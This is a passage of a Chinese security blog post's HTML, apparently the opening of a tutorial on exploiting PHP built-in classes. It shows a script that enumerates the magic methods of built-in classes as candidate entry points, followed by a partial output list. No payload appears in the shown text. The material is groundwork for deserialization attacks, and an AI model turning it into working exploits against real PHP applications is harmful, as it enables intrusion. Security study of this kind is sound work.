@@ -1,0 +1,1095 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="sky123">
+    
+    <!-- Completely eliminate flash of wrong theme -->
+    <script>
+        (function() {
+            const THEME_KEY = "REDEFINE-THEME-STATUS";
+            const DARK = "dark", LIGHT = "light";
+            
+            // Get preferred theme
+            function getTheme() {
+                try {
+                    const saved = localStorage.getItem(THEME_KEY);
+                    if (saved) {
+                        const { isDark } = JSON.parse(saved);
+                        return isDark ? DARK : LIGHT;
+                    }
+                } catch (e) {}
+                
+                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
+            }
+            
+            // Apply theme to document
+            function applyTheme(theme) {
+                const isDark = theme === DARK;
+                const root = document.documentElement;
+                
+                // Set data attribute for CSS variables
+                root.setAttribute("data-theme", theme);
+                
+                // Set classes for compatibility
+                root.classList.add(theme);
+                root.classList.remove(isDark ? LIGHT : DARK);
+                root.style.colorScheme = theme;
+            }
+            
+            // Initial application
+            const theme = getTheme();
+            applyTheme(theme);
+            
+            // Listen for system preference changes
+            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
+                // Only update if using system preference (no localStorage entry)
+                if (!localStorage.getItem(THEME_KEY)) {
+                    applyTheme(matches ? DARK : LIGHT);
+                }
+            });
+            
+            // Set body classes once DOM is ready
+            if (document.readyState !== "loading") {
+                document.body.classList.add(theme + "-mode");
+            } else {
+                document.addEventListener("DOMContentLoaded", () => {
+                    document.body.classList.add(theme + "-mode");
+                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
+                });
+            }
+        })();
+    </script>
+    
+    <!-- Critical CSS to prevent flash -->
+    <style>
+        :root[data-theme="dark"] {
+            --background-color: #202124;
+            --background-color-transparent: rgba(32, 33, 36, 0.6);
+            --second-background-color: #2d2e32;
+            --third-background-color: #34353a;
+            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #ffffff;
+            --second-text-color: #eeeeee;
+            --third-text-color: #bebec6;
+            --fourth-text-color: #999999;
+            --default-text-color: #bebec6;
+            --invert-text-color: #373D3F;
+            --border-color: rgba(255, 255, 255, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(255, 255, 255, 0.08);
+            --shadow-color-2: rgba(255, 255, 255, 0.05);
+        }
+        
+        :root[data-theme="light"] {
+            --background-color: #fff;
+            --background-color-transparent: rgba(255, 255, 255, 0.6);
+            --second-background-color: #f8f8f8;
+            --third-background-color: #f2f2f2;
+            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
+            --primary-color: #0066CC;
+            --first-text-color: #16171a;
+            --second-text-color: #2f3037;
+            --third-text-color: #5e5e5e;
+            --fourth-text-color: #eeeeee;
+            --default-text-color: #373D3F;
+            --invert-text-color: #bebec6;
+            --border-color: rgba(0, 0, 0, 0.08);
+            --selection-color: #0066CC;
+            --shadow-color-1: rgba(0, 0, 0, 0.08);
+            --shadow-color-2: rgba(0, 0, 0, 0.05);
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+        
+        /* Apply body classes as soon as DOM is ready */
+        :root[data-theme="dark"] body {
+            background-color: var(--background-color);
+            color: var(--default-text-color);
+        }
+    </style>
+    
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="https://skyi23.github.io/2025/08/11/php 原生类利用/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+    
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/null" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/null">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/null">
+    <!--- Page Info-->
+    
+    <title>
+        
+            PHP 原生类利用 | sky123&#39;s site
+        
+    </title>
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+
+    <!--- Inject Part-->
+    
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/tailwind.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">
+
+    
+<link rel="stylesheet" href="/fonts/Geist/geist.css">
+
+    <!--- Font Part-->
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap" rel="stylesheet">
+    
+    
+    
+    
+    
+
+    <script id="hexo-configurations">
+    window.config = {"hostname":"skyi23.github.io","root":"/","language":"en","path":"search.xml"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":false,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":true,"family":"JetBrains Mono","url":"https://fonts.googleapis.com/css2?family=JetBrains+Mono&display=swap"}},"toc":{"enable":true,"max_depth":5,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":true},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":false,"custom_message":null},"side_tools":{"gear_rotation":true,"auto_expand":false},"open_graph":{"enable":false,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"sky123's blog","subtitle":{"text":["书有未曾经我读，事无不可对人言"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":true,"version":"11.4.1"}},"version":"2.8.5","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"分类":{"icon":"fa-solid fa-folder","path":"/categories/"},"标签":{"icon":"fa-solid fa-tags","path":"/tags/"},"书签":{"icon":"fa-solid fa-bookmark","path":"/bookmarks/"}},"search":{"enable":true,"preload":true}},"page_templates":{"bookmarks_column":3,"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"show_on_mobile":true,"links":null},"article_date_format":"auto","excerpt_length":200,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2024/11/7 00:00:00"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<!-- hexo injector head_end start --><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.15.3/dist/katex.min.css" integrity="sha256-TThEtR+XalhWKkfF383YLOrI50NGNeIqrzS+q08afrY=" crossorigin="anonymous"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+
+<body>
+	<div class="progress-bar-container">
+	
+	<span class="scroll-progress-bar"></span>
+	
+
+	
+	<span class="pjax-progress-bar"></span>
+	<!--        <span class="swup-progress-icon">-->
+	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
+	<!--        </span>-->
+	
+</div>
+
+<main class="page-container" id="swup">
+
+	
+
+	<div class="main-content-container flex flex-col justify-between min-h-dvh">
+		<div class="main-content-header">
+			<header class="navbar-container px-6 md:px-12">
+    <div class="navbar-content transition-navbar ">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                sky123&#39;s site
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/"
+                                        >
+                                    <i class="fa-regular fa-house fa-fw"></i>
+                                    HOME
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/categories/"
+                                        >
+                                    <i class="fa-solid fa-folder fa-fw"></i>
+                                    分类
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/tags/"
+                                        >
+                                    <i class="fa-solid fa-tags fa-fw"></i>
+                                    标签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            
+
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class=""
+                                   href="/bookmarks/"
+                                        >
+                                    <i class="fa-solid fa-bookmark fa-fw"></i>
+                                    书签
+                                    
+                                </a>
+
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
+                    </div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile sheet -->
+    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
+        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/"
+                        >
+                            <span>
+                                HOME
+                            </span>
+                            
+                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/categories/"
+                        >
+                            <span>
+                                分类
+                            </span>
+                            
+                                <i class="fa-solid fa-folder fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/tags/"
+                        >
+                            <span>
+                                标签
+                            </span>
+                            
+                                <i class="fa-solid fa-tags fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+                
+                    
+
+                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
+                        
+                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
+                           href="/bookmarks/"
+                        >
+                            <span>
+                                书签
+                            </span>
+                            
+                                <i class="fa-solid fa-bookmark fa-sm fa-fw"></i>
+                            
+                        </a>
+                        
+
+                        
+                    </li>
+            
+
+            
+            
+        </ul>
+
+        <div class="statistics flex justify-around my-2.5">
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
+        <div class="label text-third-text-color text-sm">Tags</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">15</div>
+        <div class="label text-third-text-color text-sm">Categories</div>
+    </a>
+    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
+        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">47</div>
+        <div class="label text-third-text-color text-sm">Posts</div>
+    </a>
+</div>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+		</div>
+
+		<div class="main-content-body transition-fade-up">
+			
+
+			<div class="main-content">
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">PHP 原生类利用</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+				<img src="/images/icon.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">sky123</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-08-11 23:53:58</span>
+        <span class="mobile">2025-08-11 23:53:58</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-08-02 21:33:10</span>
+            <span class="mobile">2025-08-02 21:33:10</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/web/">web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/web/php-web/">php web</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/php-web/">php web</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.8k Words</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>8 Mins</span>
+        </span>
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<h1 id="PHP-原生类利用"><a href="#PHP-原生类利用" class="headerlink" title="PHP 原生类利用"></a>PHP 原生类利用</h1><p><strong>PHP 原生类</strong>指的是 <strong>PHP 自带提供、无需用户定义</strong>、通常由 PHP 内核或扩展模块实现的类。我们可以通过 <code>get_declared_classes()</code> 函数获取当前脚本中所有已经定义的类的名称，然后枚举其中所有的魔术方法。</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 获取当前已声明的所有类名</span></span><br><span class="line"><span class="variable">$classes</span> = <span class="title function_ invoke__">get_declared_classes</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义魔术方法列表（用于安全研究中识别可被利用的入口）</span></span><br><span class="line"><span class="variable">$magicMethods</span> = [</span><br><span class="line">    <span class="string">&#x27;__destruct&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__toString&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__wakeup&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__call&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__callStatic&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__get&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__set&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__isset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__unset&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__invoke&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;__set_state&#x27;</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="comment">// 遍历所有类</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$classes</span> <span class="keyword">as</span> <span class="variable">$class</span>) &#123;</span><br><span class="line">    <span class="comment">// 获取当前类中声明的方法</span></span><br><span class="line">    <span class="variable">$methods</span> = <span class="title function_ invoke__">get_class_methods</span>(<span class="variable">$class</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$methods</span>) <span class="keyword">continue</span>; <span class="comment">// 若类没有方法则跳过</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 遍历方法，查找是否包含魔术方法</span></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$methods</span> <span class="keyword">as</span> <span class="variable">$method</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$method</span>, <span class="variable">$magicMethods</span>, <span class="literal">true</span>)) &#123;</span><br><span class="line">            <span class="comment">// 输出符合条件的类名与方法名</span></span><br><span class="line">            <span class="keyword">print</span> <span class="string">&quot;<span class="subst">&#123;$class&#125;</span>::<span class="subst">&#123;$method&#125;</span>\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>结果如下（可能由于 <strong>PHP 版本</strong>还有<strong>加载的扩展</strong>不同，结果会稍有差别）：</p>
+<div class="code-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Exception</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ErrorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Error</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">CompileError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ParseError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">TypeError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArgumentCountError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ValueError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ValueError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ArithmeticError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DivisionByZeroError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">UnhandledMatchError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">UnhandledMatchError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ClosedGeneratorException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">FiberError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">FiberError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTime</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeImmutable</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateTimeZone</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DateInterval</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">DatePeriod</span>::<span class="variable constant_">__set_state</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">JsonException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Random\RandomError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\RandomError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Random\BrokenRandomEngineError</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\BrokenRandomEngineError</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">Random\RandomException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">Random\RandomException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">ReflectionException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunctionAbstract</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionFunction</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionParameter</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionNamedType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionUnionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionIntersectionType</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionMethod</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionObject</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionProperty</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionClassConstant</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionZendExtension</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionAttribute</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionEnum</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionEnumUnitCase</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">ReflectionEnumBackedCase</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">LogicException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title class_">BadFunctionCallException</span>::<span class="variable constant_">__toString</span></span><br><span class="line"><span class="title class_">BadMethodCallException</span>::<span class="variable constant_">__wakeup</span></span><br><span class="line"><span class="title 